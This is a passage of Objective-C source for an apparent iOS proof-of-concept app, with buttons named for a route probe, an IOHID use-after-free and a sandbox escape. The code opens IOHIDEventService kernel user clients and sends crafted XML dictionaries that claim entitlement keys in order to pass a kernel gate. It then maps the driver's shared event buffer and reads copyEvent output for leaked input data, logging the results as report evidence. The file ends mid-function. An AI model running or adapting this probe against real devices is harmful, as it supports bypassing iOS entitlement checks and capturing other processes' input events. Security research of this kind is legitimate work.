        [self.pfRouteProbeButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
        [self.pfRouteProbeButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
        [self.iohidUAFButton.topAnchor constraintEqualToAnchor:self.pfRouteProbeButton.bottomAnchor constant:12],
        [self.iohidUAFButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
        [self.iohidUAFButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
        [self.sandboxEscapeButton.topAnchor constraintEqualToAnchor:self.iohidUAFButton.bottomAnchor constant:12],
        [self.sandboxEscapeButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
        [self.sandboxEscapeButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
        [self.logView.topAnchor constraintEqualToAnchor:self.sandboxEscapeButton.bottomAnchor constant:20],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
    ]];
}

// ---- Symbol loading ----

- (BOOL)loadIOKitSymbols {
    // Fix #3: gate on ALL required symbols to avoid partial-load cache hit
    if (sIOKitHandle
        && sIOServiceMatching
        && sIOServiceGetMatchingService
        && sIOServiceOpen
        && sIOServiceClose
        && sIOObjectRelease
        && sIOIteratorNext
        && sIOConnectCallMethod) {
        return YES;
    }

    if (!sIOKitHandle) {
        sIOKitHandle = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW | RTLD_LOCAL);
    }
    if (!sIOKitHandle) return NO;

    sIOServiceMatching            = (IOServiceMatchingFn)           dlsym(sIOKitHandle, "IOServiceMatching");
    sIOServiceGetMatchingService  = (IOServiceGetMatchingServiceFn) dlsym(sIOKitHandle, "IOServiceGetMatchingService");
    sIOServiceGetMatchingServices = (IOServiceGetMatchingServicesFn)dlsym(sIOKitHandle, "IOServiceGetMatchingServices");
    sIOServiceOpen                = (IOServiceOpenFn)               dlsym(sIOKitHandle, "IOServiceOpen");
    sIOServiceClose               = (IOServiceCloseFn)              dlsym(sIOKitHandle, "IOServiceClose");
    sIOObjectRelease              = (IOObjectReleaseFn)             dlsym(sIOKitHandle, "IOObjectRelease");
    sIOIteratorNext               = (IOIteratorNextFn)              dlsym(sIOKitHandle, "IOIteratorNext");
    sIOConnectCallMethod          = (IOConnectCallMethodFn)         dlsym(sIOKitHandle, "IOConnectCallMethod");
    sIOConnectMapMemory64         = (IOConnectMapMemoryFn)          dlsym(sIOKitHandle, "IOConnectMapMemory64");
    sIOConnectUnmapMemory64       = (IOConnectUnmapMemoryFn)       dlsym(sIOKitHandle, "IOConnectUnmapMemory64");
    sIORegistryEntryGetRegistryEntryID = (IORegistryEntryGetRegistryEntryIDFn)dlsym(sIOKitHandle, "IORegistryEntryGetRegistryEntryID");
    sIOObjectCopyClass     = (IOObjectCopyClassFn)    dlsym(sIOKitHandle, "IOObjectCopyClass");
    sIORegistryEntryGetName = (IORegistryEntryGetNameFn)dlsym(sIOKitHandle, "IORegistryEntryGetName");
    sIOConnectGetService = (IOConnectGetServiceFn)dlsym(sIOKitHandle, "IOConnectGetService");
    sIORegistryEntryCreateCFProperties =
        (IORegistryEntryCreateCFPropertiesFn)dlsym(sIOKitHandle, "IORegistryEntryCreateCFProperties");

    return sIOServiceMatching
        && sIOServiceGetMatchingService
        && sIOServiceOpen
        && sIOServiceClose
        && sIOObjectRelease
        && sIOIteratorNext
        && sIOConnectCallMethod;
}

- (BOOL)loadSecuritySymbols {
    if (sSecurityHandle && sSecTaskCreateFromSelf && sSecTaskCopyValueForEntitlement) {
        return YES;
    }

    if (!sSecurityHandle) {
        sSecurityHandle = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW | RTLD_LOCAL);
    }
    if (!sSecurityHandle) return NO;

    sSecTaskCreateFromSelf = (SecTaskCreateFromSelfFn)dlsym(sSecurityHandle, "SecTaskCreateFromSelf");
    sSecTaskCopyValueForEntitlement =
        (SecTaskCopyValueForEntitlementFn)dlsym(sSecurityHandle, "SecTaskCopyValueForEntitlement");
    return sSecTaskCreateFromSelf && sSecTaskCopyValueForEntitlement;
}

// ---- Main flow ----

- (void)triggerTapped {
    [self appendLog:@"\n========== Boundary Test =========="];

    if (![self loadIOKitSymbols]) {
        [self appendLog:@"FAIL: could not load IOKit symbols."];
        return;
    }

    // Run controls first on isolated connections, then keep only the candidate connection.
    [self appendLog:@"\n--- Step 1: selector 0 controls + candidate (isolated connections) ---"];
    kern_return_t krEmpty = [self probeOpenVariantXML:kOpenPropertiesXMLEmpty
                                                label:@"selector 0 probe (empty dict)"
                                       keepConnection:NO
                                  runPreOpenCopyProbe:NO
                                        outPreCopyKr:NULL
                                  outPreCopyNonZero:NULL
                                        outConnection:NULL];
    kern_return_t krOneKey = [self probeOpenVariantXML:kOpenPropertiesXMLOneKey
                                                 label:@"selector 0 probe (one key)"
                                        keepConnection:NO
                                   runPreOpenCopyProbe:NO
                                         outPreCopyKr:NULL
                                   outPreCopyNonZero:NULL
                                         outConnection:NULL];
    kern_return_t krMalformed = [self probeOpenVariantXML:kOpenPropertiesMalformedXML
                                                    label:@"selector 0 probe (malformed XML)"
                                           keepConnection:NO
                                      runPreOpenCopyProbe:NO
                                            outPreCopyKr:NULL
                                      outPreCopyNonZero:NULL
                                            outConnection:NULL];
    kern_return_t krGarbage = [self probeOpenVariantXML:kOpenPropertiesGarbage
                                                  label:@"selector 0 probe (garbage blob)"
                                         keepConnection:NO
                                    runPreOpenCopyProbe:NO
                                          outPreCopyKr:NULL
                                    outPreCopyNonZero:NULL
                                          outConnection:NULL];

    io_connect_t connection = MACH_PORT_NULL;
    kern_return_t preCopyKr = KERN_FAILURE;
    BOOL preCopyNonZero = NO;
    kern_return_t kr = [self probeOpenVariantXML:kOpenPropertiesXML
                                           label:@"selector 0 candidate (both keys)"
                                  keepConnection:YES
                            runPreOpenCopyProbe:YES
                                  outPreCopyKr:&preCopyKr
                            outPreCopyNonZero:&preCopyNonZero
                                   outConnection:&connection];

    BOOL anyControlSucceeded = (krEmpty == KERN_SUCCESS
                                || krOneKey == KERN_SUCCESS
                                || krMalformed == KERN_SUCCESS
                                || krGarbage == KERN_SUCCESS);
    if (kr == KERN_SUCCESS && !anyControlSucceeded) {
        [self appendLog:@"INTERESTING: controls failed while candidate succeeded (strong boundary-test signal)."];
    } else if (kr == KERN_SUCCESS) {
        [self appendLog:@"INCONCLUSIVE: candidate succeeded, but at least one control also succeeded."];
        if (krMalformed == KERN_SUCCESS || krGarbage == KERN_SUCCESS) {
            [self appendLog:@"HIGH SIGNAL: selector 0 accepted malformed/garbage properties."];
        }
    }

    if (kr != KERN_SUCCESS) {
        [self appendLog:@"Gate did not pass. Cleaning up."];
        if (connection != MACH_PORT_NULL) {
            sIOServiceClose(connection);
        }
        return;
    }

    [self appendLog:[NSString stringWithFormat:@"Using candidate connection 0x%x for copyEvent checks.", connection]];
    [self appendLog:[NSString stringWithFormat:@"Pre-open baseline copyEvent: kr=0x%x (%s), nonZeroStruct=%@",
                     preCopyKr,
                     mach_error_string(preCopyKr),
                     preCopyNonZero ? @"YES" : @"NO"]];

    // -- Step 2: map shared memory for event buffer --
    [self appendLog:@"\n--- Step 2: IOConnectMapMemory64 (type=0) ---"];
    mach_vm_address_t mappedAddr = 0;
    mach_vm_size_t    mappedSize = 0;
    kr = [self mapEventBuffer:connection address:&mappedAddr size:&mappedSize];
    [self logKernReturn:kr label:@"IOConnectMapMemory64"];

    BOOL haveMappedBuffer = (kr == KERN_SUCCESS && mappedAddr != 0 && mappedSize > 0);
    if (haveMappedBuffer) {
        [self appendLog:[NSString stringWithFormat:@"Mapped %llu bytes at 0x%llx", mappedSize, mappedAddr]];
    } else {
        [self appendLog:@"No mapped buffer — will still attempt copyEvent via struct output."];
    }

    // -- Step 3: selector 2 (copyEvent) attempts --
    [self appendLog:@"\n--- Step 3: selector 2 (copyEvent) ---"];
    BOOL sawPostNonZeroStruct = NO;
    BOOL sawPostMappedSignal = NO;
    [self tryCopyEvent:connection
            mappedAddr:mappedAddr
            mappedSize:mappedSize
             haveMapped:haveMappedBuffer
      outSawNonZeroStruct:&sawPostNonZeroStruct
      outSawMappedSignal:&sawPostMappedSignal];

    if (!preCopyNonZero && (sawPostNonZeroStruct || sawPostMappedSignal)) {
        [self appendLog:@"STATE TRANSITION: pre-open copyEvent had no non-zero output, post-open did (strong boundary signal)."];
    } else if (preCopyNonZero == sawPostNonZeroStruct) {
        [self appendLog:@"No clear copyEvent struct-output transition observed across selector 0 boundary."];
    }

    // Compact run summary for report notes.
    [self appendLog:@"\n--- Report Bundle ---"];
    [self appendLog:[NSString stringWithFormat:@"bundle=%@ ios=%@",
                     NSBundle.mainBundle.bundleIdentifier ?: @"<nil>",
                     UIDevice.currentDevice.systemVersion ?: @"<nil>"]];
    [self appendLog:[NSString stringWithFormat:
                     @"selector0 results: empty=0x%x oneKey=0x%x malformed=0x%x garbage=0x%x candidate=0x%x",
                     krEmpty, krOneKey, krMalformed, krGarbage, kr]];
    [self appendLog:[NSString stringWithFormat:
                     @"copyEvent boundary: preOpen=0x%x postStructSignal=%@ postMappedSignal=%@",
                     preCopyKr,
                     sawPostNonZeroStruct ? @"YES" : @"NO",
                     sawPostMappedSignal ? @"YES" : @"NO"]];
    [self appendEntitlementReport];

    // -- Step 4: close and unmap --
    [self appendLog:@"\n--- Step 4: cleanup ---"];
    // Unmap first while the user client is still open.
    if (haveMappedBuffer && sIOConnectUnmapMemory64) {
        kern_return_t unmapKr = sIOConnectUnmapMemory64(connection, kMemoryTypeEventBuffer,
                                                        mach_task_self(), mappedAddr);
        [self logKernReturn:unmapKr label:@"IOConnectUnmapMemory64"];
        if (unmapKr != KERN_SUCCESS) {
            kern_return_t deallocKr = vm_deallocate(mach_task_self(),
                                                    (vm_address_t)mappedAddr,
                                                    (vm_size_t)mappedSize);
            [self logKernReturn:deallocKr label:@"Fallback vm_deallocate"];
        }
    } else if (haveMappedBuffer) {
        // Fallback: deallocate the VM region directly
        kern_return_t deallocKr = vm_deallocate(mach_task_self(),
                                                (vm_address_t)mappedAddr,
                                                (vm_size_t)mappedSize);
        [self logKernReturn:deallocKr label:@"Fallback vm_deallocate"];
    }

    uint64_t closeScalar = 0;
    kr = sIOConnectCallMethod(connection, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
    [self logKernReturn:kr label:@"selector 1 (close)"];

    sIOServiceClose(connection);
    [self appendLog:@"\n========== Done =========="];
}

// ---- Fast-path open (selector 0) ----

- (kern_return_t)fastPathOpen:(io_connect_t)connection propertiesXML:(const char *)propertiesXML {
    // Selector 0 dispatch entry:
    //   scalarInputCnt  = 1   (service index)
    //   structInputSize = -1  (any — XML-serialised OSDictionary)
    //
    // The kernel calls OSUnserializeXML on the struct input, then
    // checks getObject("FastPathHasEntitlement") and
    // getObject("FastPathMotionEventEntitlement") on the resulting
    // dictionary.  Both keys must be present to pass the gate.

    uint64_t scalarIn = 0; // service index / event-service ordinal

    // The struct input is a null-terminated XML plist string.
    const char *xml = propertiesXML ?: kOpenPropertiesXMLEmpty;
    const void *structIn  = xml;
    size_t structInSize   = strlen(xml) + 1; // include null terminator

    kern_return_t kr = sIOConnectCallMethod(
        connection,
        kSelectorOpen,
        &scalarIn, 1,            // 1 scalar input
        structIn, structInSize,  // struct input (XML plist)
        NULL, NULL,              // no scalar output
        NULL, NULL               // no struct output
    );
    return kr;
}

- (kern_return_t)probeOpenVariantXML:(const char *)propertiesXML
                               label:(NSString *)label
                      keepConnection:(BOOL)keepConnection
                 runPreOpenCopyProbe:(BOOL)runPreOpenCopyProbe
                         outPreCopyKr:(kern_return_t *)outPreCopyKr
                   outPreCopyNonZero:(BOOL *)outPreCopyNonZero
                       outConnection:(io_connect_t *)outConnection {
    if (outConnection) {
        *outConnection = MACH_PORT_NULL;
    }
    if (outPreCopyKr) {
        *outPreCopyKr = KERN_FAILURE;
    }
    if (outPreCopyNonZero) {
        *outPreCopyNonZero = NO;
    }

    // Probe across all IOHIDEventService instances so a busy instance does not block the test.
    if (!sIOServiceGetMatchingServices || !sIOIteratorNext) {
        [self appendLog:[NSString stringWithFormat:@"%@: setup failed 0x%x (%s)",
                         label, KERN_NOT_SUPPORTED, "iterator symbols unavailable"]];
        return KERN_NOT_SUPPORTED;
    }

    CFMutableDictionaryRef matching = sIOServiceMatching("IOHIDEventService");
    if (!matching) {
        [self appendLog:[NSString stringWithFormat:@"%@: setup failed 0x%x (%s)",
                         label, KERN_INVALID_ARGUMENT, "IOServiceMatching failed"]];
        return KERN_INVALID_ARGUMENT;
    }

    io_iterator_t iter = MACH_PORT_NULL;
    kern_return_t iterKr = sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter);
    if (iterKr != KERN_SUCCESS || iter == MACH_PORT_NULL) {
        [self appendLog:[NSString stringWithFormat:@"%@: setup failed 0x%x (%s)",
                         label, iterKr, mach_error_string(iterKr)]];
        return (iterKr == KERN_SUCCESS ? KERN_NOT_FOUND : iterKr);
    }

    kern_return_t lastKr = KERN_NOT_FOUND;
    uint32_t idx = 0;
    io_service_t service = MACH_PORT_NULL;

    while ((service = sIOIteratorNext(iter)) != MACH_PORT_NULL) {
        idx++;
        uint64_t entryID = 0;
        BOOL hasEntryID = NO;
        if (sIORegistryEntryGetRegistryEntryID) {
            hasEntryID = (sIORegistryEntryGetRegistryEntryID(service, &entryID) == KERN_SUCCESS);
        }

        // Query service class and registry name before opening (service is still valid).
        NSString *serviceClass = nil;
        NSString *serviceName = nil;
        if (sIOObjectCopyClass) {
            CFStringRef cfClass = sIOObjectCopyClass(service);
            if (cfClass) {
                serviceClass = [(__bridge NSString *)cfClass copy];
                CFRelease(cfClass);
            }
        }
        if (sIORegistryEntryGetName) {
            char nameBuf[128] = {0};
            if (sIORegistryEntryGetName(service, nameBuf) == KERN_SUCCESS && nameBuf[0]) {
                serviceName = [NSString stringWithUTF8String:nameBuf];
            }
        }

        io_connect_t probeConnection = MACH_PORT_NULL;
        kern_return_t openKr = sIOServiceOpen(service, mach_task_self_, 2, &probeConnection);
        sIOObjectRelease(service);

        NSMutableString *instanceLabel = [NSMutableString stringWithFormat:@"instance#%u", idx];
        if (hasEntryID)    [instanceLabel appendFormat:@" entryID=0x%llx", entryID];
        if (serviceClass)  [instanceLabel appendFormat:@" class=%@", serviceClass];
        if (serviceName)   [instanceLabel appendFormat:@" name=%@", serviceName];

        if (openKr != KERN_SUCCESS || probeConnection == MACH_PORT_NULL) {
            lastKr = openKr;
            [self appendLog:[NSString stringWithFormat:@"%@ [%@] open failed 0x%x (%s)",
                             label, instanceLabel, openKr, mach_error_string(openKr)]];
            continue;
        }

        kern_return_t preCopyKr = KERN_FAILURE;
        BOOL preCopyNonZero = NO;
        if (runPreOpenCopyProbe) {
            preCopyKr = [self singleCopyEventProbe:probeConnection
                                             label:[NSString stringWithFormat:@"%@ pre-open copyEvent [%@]", label, instanceLabel]
                                    outSawNonZero:&preCopyNonZero];
        }

        kern_return_t kr = [self fastPathOpen:probeConnection propertiesXML:propertiesXML];
        [self logKernReturn:kr label:[NSString stringWithFormat:@"%@ [%@]", label, instanceLabel]];

        if (kr == KERN_SUCCESS && keepConnection) {
            if (outConnection) {
                *outConnection = probeConnection;
            } else {
                sIOServiceClose(probeConnection);
            }
            if (outPreCopyKr) {
                *outPreCopyKr = preCopyKr;
            }
            if (outPreCopyNonZero) {
                *outPreCopyNonZero = preCopyNonZero;
            }
            sIOObjectRelease(iter);
            return kr;
        }

        if (kr == KERN_SUCCESS) {
            uint64_t closeScalar = 0;
            kern_return_t closeKr = sIOConnectCallMethod(probeConnection, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
            [self logKernReturn:closeKr label:[NSString stringWithFormat:@"%@ -> selector 1 (close) [%@]", label, instanceLabel]];
            sIOServiceClose(probeConnection);
            sIOObjectRelease(iter);
            return kr;
        }

        lastKr = kr;
        sIOServiceClose(probeConnection);
    }

    sIOObjectRelease(iter);
    return lastKr;
}

// ---- Map shared event buffer ----

- (kern_return_t)mapEventBuffer:(io_connect_t)connection
                        address:(mach_vm_address_t *)outAddr
                           size:(mach_vm_size_t *)outSize {
    if (!sIOConnectMapMemory64) {
        [self appendLog:@"IOConnectMapMemory64 symbol not available."];
        return KERN_FAILURE;
    }

    *outAddr = 0;
    *outSize = 0;

    // kIOMapAnywhere = 1
    kern_return_t kr = sIOConnectMapMemory64(
        connection,
        kMemoryTypeEventBuffer,
        mach_task_self(),
        outAddr,
        outSize,
        1 /* kIOMapAnywhere */
    );
    return kr;
}

- (kern_return_t)singleCopyEventProbe:(io_connect_t)connection
                                 label:(NSString *)label
                        outSawNonZero:(BOOL *)outSawNonZero {
    if (outSawNonZero) {
        *outSawNonZero = NO;
    }

    uint64_t scalarsIn[2] = { 0, 1 /* no filter */ };
    uint8_t structOut[kEventOutputBufferSize];
    memset(structOut, 0xA5, sizeof(structOut));
    size_t structOutSize = sizeof(structOut);

    kern_return_t kr = sIOConnectCallMethod(
        connection,
        kSelectorCopyEvent,
        scalarsIn, 2,
        NULL, 0,
        NULL, NULL,
        structOut, &structOutSize
    );

    size_t checkLen = MIN(structOutSize, sizeof(structOut));
    BOOL modified = (checkLen > 0) && [self bufferModified:structOut sentinel:0xA5 length:checkLen];
    BOOL nonZero = modified && [self bufferHasAnyNonZero:structOut length:checkLen];
    if (outSawNonZero && nonZero) {
        *outSawNonZero = YES;
    }

    [self appendLog:[NSString stringWithFormat:@"%@: kr=0x%x (%s) structOutSize=%zu nonZeroStruct=%@",
                     label, kr, mach_error_string(kr), structOutSize, nonZero ? @"YES" : @"NO"]];
    if (modified && !nonZero) {
        [self appendLog:@"  NOTE: pre-open struct output changed but remained zero-filled."];
    }

    return kr;
}

// ---- CopyEvent (selector 2) ----

- (void)tryCopyEvent:(io_connect_t)connection
          mappedAddr:(mach_vm_address_t)mappedAddr
          mappedSize:(mach_vm_size_t)mappedSize
          haveMapped:(BOOL)haveMapped
   outSawNonZeroStruct:(BOOL *)outSawNonZeroStruct
    outSawMappedSignal:(BOOL *)outSawMappedSignal {

    if (outSawNonZeroStruct) {
        *outSawNonZeroStruct = NO;
    }
    if (outSawMappedSignal) {
        *outSawMappedSignal = NO;
    }

    // Selector 2 dispatch entry:
    //   scalarInputCnt   = 2   [eventIndex, filterMode]
    //   structInputSize  = -1  (optional filter dict)
    //   scalarOutputCnt  = 0
    //   structOutputSize = -1  (event data via struct output)
    //
    // filterMode: 0 = use struct input as filter dict,
    //             1 = no filter (empty dict)

    // Fix #1: cap the probe window and treat mapped region as read-only.
    // The kernel writes into it; we only read to detect changes.
    // Take a read-only snapshot of the first kMappedProbeMax bytes
    // before each call, then compare after.
    size_t probeLen = 0;
    uint8_t *preSnapshot = NULL;
    if (haveMapped && mappedAddr && mappedSize > 0) {
        probeLen = MIN((size_t)mappedSize, kMappedProbeMax);
        preSnapshot = (uint8_t *)malloc(probeLen);
    }

    static const uint32_t kCopyEventProbeIters = 4;
    uint8_t prevStructPreview[32] = {0};
    BOOL havePrevStructPreview = NO;
    uint8_t prevMappedPreview[32] = {0};
    BOOL havePrevMappedPreview = NO;

    for (uint32_t iter = 0; iter < kCopyEventProbeIters; iter++) {
        // Use identical inputs each round so data instability is meaningful.
        uint64_t scalarsIn[2] = { 0, 1 /* no filter */ };

        // Snapshot mapped region BEFORE the call (read-only observation)
        if (preSnapshot) {
            memcpy(preSnapshot, (const void *)(uintptr_t)mappedAddr, probeLen);
        }

        // Provide a struct output buffer in case the framework
        // copies data back that way.
        uint8_t structOut[kEventOutputBufferSize];
        memset(structOut, 0xA5, sizeof(structOut));
        size_t structOutSize = sizeof(structOut);

        kern_return_t kr = sIOConnectCallMethod(
            connection,
            kSelectorCopyEvent,
            scalarsIn, 2,
            NULL, 0,                    // no struct input (filterMode=1)
            NULL, NULL,                 // no scalar output
            structOut, &structOutSize
        );

        const char *err = mach_error_string(kr);
        [self appendLog:[NSString stringWithFormat:@"copyEvent[%u] kr=0x%x (%s) structOutSize=%zu",
                         iter, kr, err ? err : "?", structOutSize]];

        // Treat a struct-output signal as meaningful only when non-zero bytes
        // appear or data is unstable across identical calls.
        if (structOutSize > 0) {
            size_t checkLen = MIN(structOutSize, sizeof(structOut));
            BOOL modified = [self bufferModified:structOut sentinel:0xA5 length:checkLen];
            if (modified) {
                size_t previewLen = MIN((size_t)32, checkLen);
                BOOL nonZero = [self bufferHasAnyNonZero:structOut length:checkLen];
                BOOL unstable = NO;
                if (havePrevStructPreview && previewLen > 0) {
                    unstable = (memcmp(prevStructPreview, structOut, previewLen) != 0);
                }
                if (previewLen > 0) {
                    memcpy(prevStructPreview, structOut, previewLen);
                    havePrevStructPreview = YES;
                }

                if (nonZero || unstable) {
                    if (outSawNonZeroStruct && nonZero) {
                        *outSawNonZeroStruct = YES;
                    }
                    [self appendLog:[NSString stringWithFormat:
                                     @"  SIGNAL: struct output non-zero/unstable (kr=0x%x, nonZero=%@, unstable=%@) preview: %@",
                                     kr, nonZero ? @"YES" : @"NO", unstable ? @"YES" : @"NO",
                                     [self hexPreview:structOut length:previewLen]]];
                } else {
                    [self appendLog:@"  NOTE: struct output changed but remained zero-filled; not counted as boundary signal."];
                }
            }
        }

        // Check mapped buffer for writes (read-only compare against snapshot)
        if (preSnapshot) {
            BOOL mappedChanged = (memcmp(preSnapshot, (const void *)(uintptr_t)mappedAddr, probeLen) != 0);
            if (mappedChanged) {
                const uint8_t *mapped = (const uint8_t *)(uintptr_t)mappedAddr;
                uint32_t eventSize = 0;
                if (probeLen >= 4) {
                    memcpy(&eventSize, mapped, sizeof(eventSize));
                }
                size_t previewLen = MIN((size_t)32, probeLen);
                BOOL nonZero = [self bufferHasAnyNonZero:mapped length:previewLen];
                BOOL unstable = NO;
                if (havePrevMappedPreview && previewLen > 0) {
                    unstable = (memcmp(prevMappedPreview, mapped, previewLen) != 0);
                }
                if (previewLen > 0) {
                    memcpy(prevMappedPreview, mapped, previewLen);
                    havePrevMappedPreview = YES;
                }

                if (nonZero || unstable) {
                    if (outSawMappedSignal) {
                        *outSawMappedSignal = YES;
                    }
                    [self appendLog:[NSString stringWithFormat:
                                     @"  SIGNAL: mapped buffer changed (kr=0x%x, eventSize=%u, nonZero=%@, unstable=%@) preview: %@",
                                     kr, eventSize, nonZero ? @"YES" : @"NO", unstable ? @"YES" : @"NO",
                                     [self hexPreview:mapped length:previewLen]]];
                    [self appendLog:[NSString stringWithFormat:@"  EVENT: %@",
                                     [self eventHeaderSummary:mapped length:probeLen]]];
                } else {
                    [self appendLog:@"  NOTE: mapped buffer changed but remained zero-filled; not counted as boundary signal."];
                }
            }
        }
    }

    free(preSnapshot);
}

// ---- Service open helper (iterates matching services) ----

- (kern_return_t)openFirstMatchingService:(NSString *)className
                           userClientType:(uint32_t)type
                               connection:(io_connect_t *)outConnection {
    *outConnection = MACH_PORT_NULL;
    // Prefer iterator path so we can test every instance even if the first one exists but rejects open.
    if (sIOServiceGetMatchingServices && sIOIteratorNext) {
        CFMutableDictionaryRef matching = sIOServiceMatching(className.UTF8String);
        if (!matching) return KERN_INVALID_ARGUMENT;

        io_iterator_t iter = 0;
        kern_return_t kr = sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter);
        if (kr != KERN_SUCCESS || !iter) return (kr == KERN_SUCCESS ? KERN_NOT_FOUND : kr);

        kern_return_t lastErr = KERN_NOT_FOUND;
        uint32_t triedCount = 0;
        io_service_t service = MACH_PORT_NULL;

        while ((service = sIOIteratorNext(iter)) != MACH_PORT_NULL) {
            io_connect_t conn = MACH_PORT_NULL;
            kr = sIOServiceOpen(service, mach_task_self_, type, &conn);
            sIOObjectRelease(service);
            triedCount++;

            if (kr == KERN_SUCCESS && conn != MACH_PORT_NULL) {
                *outConnection = conn;
                [self appendLog:[NSString stringWithFormat:@"  opened service instance #%u", triedCount]];
                sIOObjectRelease(iter);
                return KERN_SUCCESS;
            }

            lastErr = kr;
            [self appendLog:[NSString stringWithFormat:@"  service instance #%u: open failed 0x%x (%s)",
                             triedCount, kr, mach_error_string(kr)]];
        }

        sIOObjectRelease(iter);
        [self appendLog:[NSString stringWithFormat:@"  tried %u instances, none opened.", triedCount]];
        return lastErr;
    }

    // Fallback path if iterator symbols are unavailable.
    CFMutableDictionaryRef matching = sIOServiceMatching(className.UTF8String);
    if (!matching) return KERN_INVALID_ARGUMENT;
    io_service_t service = sIOServiceGetMatchingService(MACH_PORT_NULL, matching);
    if (service == MACH_PORT_NULL) return KERN_NOT_FOUND;
    kern_return_t kr = sIOServiceOpen(service, mach_task_self_, type, outConnection);
    sIOObjectRelease(service);
    return kr;
}

// ---- Utility ----

- (NSString *)compactCFValue:(CFTypeRef)value {
    if (!value) return @"<absent>";
    CFTypeID tid = CFGetTypeID(value);
    if (tid == CFBooleanGetTypeID()) {
        return CFBooleanGetValue((CFBooleanRef)value) ? @"true" : @"false";
    }
    if (tid == CFStringGetTypeID()) {
        return [NSString stringWithFormat:@"\"%@\"", (__bridge NSString *)value];
    }
    NSString *desc = CFBridgingRelease(CFCopyDescription(value));
    return desc ?: @"<unknown>";
}

- (NSString *)entitlementValueForKey:(NSString *)key {
    if (![self loadSecuritySymbols]) {
        return @"<security-unavailable>";
    }

    CFTypeRef task = sSecTaskCreateFromSelf(kCFAllocatorDefault);
    if (!task) {
        return @"<task-create-failed>";
    }

    CFErrorRef error = NULL;
    CFTypeRef value = sSecTaskCopyValueForEntitlement(task, (__bridge CFStringRef)key, &error);
    NSString *out = nil;
    if (value) {
        out = [self compactCFValue:value];
        CFRelease(value);
    } else if (error) {
        out = [NSString stringWithFormat:@"<error %@>", [self compactCFValue:error]];
        CFRelease(error);
    } else {
        out = @"<absent>";
    }

    CFRelease(task);
    return out;
}

- (void)appendEntitlementReport {
    [self appendLog:@"entitlements:"];
    NSArray<NSString *> *keys = @[
        @"application-identifier",
        @"com.apple.developer.team-identifier",
        @"com.apple.private.hid.client.event-dispatch",
        @"com.apple.private.hid.client.admin",
        @"com.apple.private.hid.manager.user-access-device"
    ];
    for (NSString *key in keys) {
        [self appendLog:[NSString stringWithFormat:@"  %@=%@", key, [self entitlementValueForKey:key]]];
    }
}

- (void)logKernReturn:(kern_return_t)kr label:(NSString *)label {
    const char *err = mach_error_string(kr);
    if (kr == KERN_SUCCESS) {
        [self appendLog:[NSString stringWithFormat:@"%@: SUCCESS (0x0)", label]];
    } else {
        [self appendLog:[NSString stringWithFormat:@"%@: 0x%x (%s)", label, kr, err ? err : "unknown"]];
    }
}

- (BOOL)bufferModified:(const uint8_t *)buf sentinel:(uint8_t)sentinel length:(size_t)len {
    for (size_t i = 0; i < len; i++) {
        if (buf[i] != sentinel) return YES;
    }
    return NO;
}

- (BOOL)bufferHasAnyNonZero:(const uint8_t *)buf length:(size_t)len {
    for (size_t i = 0; i < len; i++) {
        if (buf[i] != 0) return YES;
    }
    return NO;
}

- (uint32_t)readLE32:(const uint8_t *)buf length:(size_t)len offset:(size_t)off {
    if (!buf || off + sizeof(uint32_t) > len) return 0;
    uint32_t v = 0;
    memcpy(&v, buf + off, sizeof(v));
    return v;
}

- (uint64_t)readLE64:(const uint8_t *)buf length:(size_t)len offset:(size_t)off {
    if (!buf || off + sizeof(uint64_t) > len) return 0;
    uint64_t v = 0;
    memcpy(&v, buf + off, sizeof(v));
    return v;
}

- (NSString *)eventHeaderSummary:(const uint8_t *)buf length:(size_t)len {
    if (!buf || len < 16) return @"<short event>";

    uint32_t d0 = [self readLE32:buf length:len offset:0];
    uint32_t d1 = [self readLE32:buf length:len offset:4];
    uint32_t d2 = [self readLE32:buf length:len offset:8];
    uint32_t d3 = [self readLE32:buf length:len offset:12];
    uint32_t d7 = [self readLE32:buf length:len offset:28];
    uint64_t q4 = [self readLE64:buf length:len offset:4];

    return [NSString stringWithFormat:
            @"size=0x%x ts@+4=0x%llx d1=0x%x d2=0x%x d3=0x%x d7=0x%x",
            d0, (unsigned long long)q4, d1, d2, d3, d7];
}

- (NSString *)hexPreview:(const uint8_t *)bytes length:(size_t)length {
    if (!bytes || length == 0) return @"<empty>";
    NSMutableString *hex = [NSMutableString stringWithCapacity:length * 3];
    for (size_t i = 0; i < length; i++) {
        [hex appendFormat:@"%02x", bytes[i]];
        if (i + 1 < length) [hex appendString:@" "];
    }
    return hex;
}

- (void)appendLog:(NSString *)line {
    NSLog(@"[TestPOC] %@", line);
    // Update on-screen text view (main thread)
    if (self.logView) {
        dispatch_async(dispatch_get_main_queue(), ^{
            self.logView.text = [self.logView.text stringByAppendingFormat:@"%@\n", line];
            NSRange end = NSMakeRange(self.logView.text.length - 1, 1);
            [self.logView scrollRangeToVisible:end];
        });
    }
    // Persistent log for post-reboot analysis
    static dispatch_once_t once;
    static NSFileHandle *logFH;
    dispatch_once(&once, ^{
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject stringByAppendingPathComponent:@"sword"]; [[NSFileManager defaultManager] createDirectoryAtPath:docs withIntermediateDirectories:YES attributes:nil error:nil];
        NSString *path = [docs stringByAppendingPathComponent:@"sword.log"];
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        logFH = [NSFileHandle fileHandleForWritingAtPath:path];
        [logFH seekToEndOfFile];
    });
    NSString *ts = [NSString stringWithFormat:@"[%.3f] %@\n", [[NSDate date] timeIntervalSince1970], line];
    [logFH writeData:[ts dataUsingEncoding:NSUTF8StringEncoding]];
    [logFH synchronizeFile];

    if ([NSThread isMainThread]) {
